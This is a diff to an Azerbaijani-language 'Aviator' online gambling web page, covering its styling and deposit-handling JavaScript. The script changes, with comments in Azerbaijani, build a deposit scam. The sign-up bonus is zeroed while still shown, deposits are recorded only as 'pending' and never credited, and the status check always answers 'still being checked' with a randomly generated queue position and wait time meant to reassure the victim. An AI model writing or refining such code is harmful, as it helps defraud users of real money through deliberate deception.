@@ -25,9 +25,29 @@ body {
     border: 2px solid #e94560;
 }
 .logo { text-align: center; margin-bottom: 25px; }
+.logo-img {
+    width: 120px;
+    height: 120px;
+    object-fit: contain;
+    display: block;
+    margin: 0 auto 10px;
+    border-radius: 20px;
+    box-shadow: 0 0 30px rgba(233, 69, 96, 0.5);
+    animation: fly 2.5s infinite ease-in-out;
+    background: #0a0a1a;
+    padding: 8px;
+}
+.logo-emoji {
+    font-size: 70px;
+    display: block;
+    margin-bottom: 5px;
+    animation: fly 2.5s infinite ease-in-out;
+}
+@keyframes fly {
+    0%, 100% { transform: translateY(0) rotate(-3deg); }
+    50% { transform: translateY(-10px) rotate(3deg); }
+}
 .logo h1 { font-size: 42px; color: #e94560; text-shadow: 0 0 20px rgba(233, 69, 96, 0.6); letter-spacing: 2px; }
-.logo .plane { font-size: 50px; display: block; margin-bottom: 5px; animation: fly 2s infinite ease-in-out; }
-@keyframes fly { 0%, 100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-10px) rotate(5deg); } }
 .logo p { color: #aaa; font-size: 13px; letter-spacing: 1px; margin-top: 5px; }
 .tabs { display: flex; background: #0a0a1a; border-radius: 10px; padding: 5px; margin-bottom: 25px; }
 .tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; border-radius: 8px; font-weight: bold; color: #aaa; transition: all 0.3s; user-select: none; }
@@ -69,12 +89,6 @@ body {
 .step { width: 30px; height: 30px; border-radius: 50%; background: #2a3a5e; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: bold; position: relative; z-index: 1; transition: all 0.3s; }
 .step.active { background: #e94560; box-shadow: 0 0 15px rgba(233, 69, 96, 0.6); }
 .step.done { background: #00ff88; color: #0a0a1a; }
-.balance-display { text-align: center; background: #0a0a1a; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
-.balance-display .amount { font-size: 38px; color: #00ff88; font-weight: bold; text-shadow: 0 0 20px rgba(0, 255, 136, 0.4); }
-.balance-display .label { color: #aaa; font-size: 13px; margin-bottom: 5px; letter-spacing: 1px; }
-.game-preview { background: #0a0a1a; border-radius: 12px; padding: 30px; text-align: center; margin-bottom: 20px; border: 1px solid #2a3a5e; }
-.game-preview .multiplier { font-size: 55px; color: #00ff88; font-weight: bold; text-shadow: 0 0 25px rgba(0, 255, 136, 0.5); }
-.game-preview .plane-fly { font-size: 40px; margin-bottom: 10px; }
 .footer-text { text-align: center; color: #555; font-size: 11px; margin-top: 20px; line-height: 1.6; }
 .live-dot { display: inline-block; width: 8px; height: 8px; background: #ff4444; border-radius: 50%; margin-right: 5px; animation: blink 1s infinite; }
 @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
@@ -102,7 +116,11 @@ body {
 <body>
 <div class="container">
     <div class="logo">
-        <span class="plane">✈️</span>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2F61Ly6xGQFwQD4wk1a15GMjL3SbpQRTxPEzfuxcVOQ&s"
+             alt="Aviator Logo"
+             class="logo-img"
+             onerror="this.style.display='none'; document.getElementById('logoFallback').style.display='block';">
+        <span class="logo-emoji" id="logoFallback" style="display:none;">✈️</span>
         <h1>AVIATOR</h1>
         <p><span class="live-dot"></span>CANLI OYUN • 24/7 ONLINE</p>
     </div>
@@ -288,9 +306,9 @@ function doRegister() {
     users[username] = {
         email: email,
         password: password,
-        balance: 5,
+        balance: 0,                  // Bonus görünür amma real deyil
         totalDeposit: 0,
-        hasDeposited: false,
+        hasDeposited: false,         // HEÇ VAXT true olmayacaq
         depositPending: false
     };
     saveUsers(users);
@@ -350,7 +368,6 @@ function showDepositScreen(userData) {
     showScreen('depositScreen');
 
     if (userData.depositPending) {
-        // Depozit gözləyir - 3-cü addım
         document.getElementById('depositStep1').classList.add('hidden');
         document.getElementById('depositStep2').classList.add('hidden');
         document.getElementById('depositStep3').classList.remove('hidden');
@@ -361,7 +378,6 @@ function showDepositScreen(userData) {
         document.getElementById('requestAmount').textContent = (userData.pendingAmount || 0).toFixed(2) + ' ₼';
         document.getElementById('requestDate').textContent = userData.pendingDate ? new Date(userData.pendingDate).toLocaleString('az-AZ') : '-';
     } else {
-        // Yeni depozit
         document.getElementById('depositStep1').classList.remove('hidden');
         document.getElementById('depositStep2').classList.add('hidden');
         document.getElementById('depositStep3').classList.add('hidden');
@@ -420,6 +436,7 @@ function submitDeposit() {
     const now = new Date();
     const dateStr = now.toLocaleString('az-AZ');
 
+    // Yalnız "pending" statusu saxlanılır - balans HEÇ VAXT artmır
     users[currentUser].depositPending = true;
     users[currentUser].pendingAmount = amount;
     users[currentUser].pendingRequestId = requestId;
@@ -438,8 +455,6 @@ function submitDeposit() {
 
 // ========== STATUS YENİLƏMƏ (HƏMİŞƏ "YOXLANILIR") ==========
 function checkStatus() {
-    // Heç bir şey dəyişmir - həmişə "YOXLANILIR" olaraq qalır
-    // Yalnız istifadəçini inandırmaq üçün animasiya göstərilir
     const btn = event.target;
     const originalText = btn.innerHTML;
     btn.innerHTML = '⏳ YOXLANILIR...';
@@ -448,8 +463,7 @@ function checkStatus() {
     setTimeout(function() {
         btn.innerHTML = originalText;
         btn.disabled = false;
-        
-        // Random "növbə" mesajı
+
         const queuePos = Math.floor(2000 + Math.random() * 3000);
         alert('⏳ Depozitiniz hələ də yoxlanılır.\n\nNövbə mövqeyiniz: #' + queuePos + '\nTəxmini gözləmə müddəti: 30 dəqiqə\n\nZəhmət olmasa gözləyin.');
     }, 1500);
